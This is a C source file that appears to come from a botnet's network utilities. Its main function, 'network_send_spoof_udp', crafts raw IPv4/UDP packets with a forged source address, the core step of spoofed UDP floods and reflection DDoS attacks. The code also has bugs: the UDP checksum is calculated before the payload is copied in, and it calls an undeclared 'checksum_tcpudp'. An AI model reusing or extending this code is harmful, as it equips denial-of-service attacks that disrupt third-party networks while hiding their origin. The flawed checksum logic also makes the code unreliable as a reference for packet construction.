#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>

#include "bot/utils/network.h"
#include "bot/utils/xoshiro.h"

#include <linux/ip.h>
#include <linux/udp.h>

int network_fd_limit() {
  struct rlimit limit;

  if (getrlimit(7, &limit))
    return 3 * (getdtablesize() / 4);
  else
    return 3 * (limit.rlim_cur >> 2);
}

uint16_t csum_compute(void *data, size_t len) {
  uint32_t sum = 0;
  uint16_t *p = (uint16_t *)data;
  size_t remaining = len;

  while (remaining > 1) {
    sum += ntohs(*p++);
    remaining -= 2;
  }

  if (remaining == 1) {
    sum += *((uint8_t *)p);
  }

  while (sum >> 16) {
    sum = (sum & 0xFFFF) + (sum >> 16);
  }

  return (uint16_t)~sum;
}

int network_send_spoof_udp(uint32_t daddr, uint16_t dport, uint32_t saddr, uint16_t sport,
                           void *buf, int len) {

  struct sockaddr_in dest_addr;

  dest_addr.sin_family = AF_INET;
  dest_addr.sin_port = dport;
  dest_addr.sin_addr.s_addr = daddr;

  int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (sockfd == -1) return -1;

  int enable = 1;
  if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable)) == -1) {
    close(sockfd);
    return -1;
  }

  int packet_len = sizeof(struct iphdr) + sizeof(struct udphdr) + len;
  char *packet = malloc(packet_len);
  if (!packet) {
    free(packet);
    return -1;
  }

  // resets the packet
  memset(packet, '\0', packet_len);

  struct iphdr *iph = (struct iphdr *)packet;
  struct udphdr *udph = (struct udphdr *)(iph + 1);
  char *data = (char *)(udph + 1);

  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;
  iph->tot_len = htons(packet_len);
  iph->id = xoshiro_next();
  iph->frag_off = 0;
  iph->ttl = 64;
  iph->protocol = IPPROTO_UDP;
  iph->saddr = saddr;
  iph->daddr = daddr;

  iph->check = 0;
  iph->check = csum_compute(iph, sizeof(struct iphdr));

  udph->source = sport;
  udph->dest = dport;
  udph->len = htons(sizeof(struct udphdr) + len);

  udph->check = 0;
  udph->check = checksum_tcpudp(iph, udph, udph->len, ntohs(udph->len));

  memcpy(data, buf, len);

  int ret = sendto(sockfd, packet, packet_len, 0, (struct sockaddr *)&dest_addr,
                   sizeof(struct sockaddr_in));
  close(sockfd);

  free(packet);

  return ret;
}
